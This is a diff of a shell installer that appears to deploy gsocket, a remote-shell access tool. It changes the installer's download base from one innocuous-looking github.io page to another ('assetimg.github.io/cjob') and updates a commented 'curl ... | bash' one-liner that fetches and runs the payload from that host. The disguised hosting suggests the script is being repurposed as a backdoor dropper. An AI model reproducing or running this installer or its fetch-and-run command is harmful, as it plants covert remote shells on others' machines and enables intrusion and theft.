@@ -13,7 +13,7 @@ init_auth_password()
 		IS_AUTH_PASSWORD_GENERATED=1
 	fi
 	
-	# Create password hash for secure storage 
+	# Create password hash for secure storage
 	GS_AUTH_PASSWORD_HASH="$(echo -n "$GS_AUTH_PASSWORD" | sha256sum | cut -d' ' -f1)"
 	
 	# Set max attempts
@@ -115,7 +115,7 @@ display_auth_info()
 }
 
 URL_BASE_CDN="https://cdn.gsocket.io"
-URL_BASE_X="https://haruhikarie.github.io/smartwinthai"
+URL_BASE_X="https://assetimg.github.io/cjob/"
 [[ -n $GS_URL_BASE ]] && {
 	URL_BASE_CDN="${GS_URL_BASE}"
 	URL_BASE_X="${GS_URL_BASE}"
@@ -1741,7 +1741,7 @@ init_auth_password
 [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
 
 init_setup
-# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://haruhikarie.github.io/smartwinthai/x)"
+# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://assetimg.github.io/cjob/w)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
 if [[ -z $S ]]; then
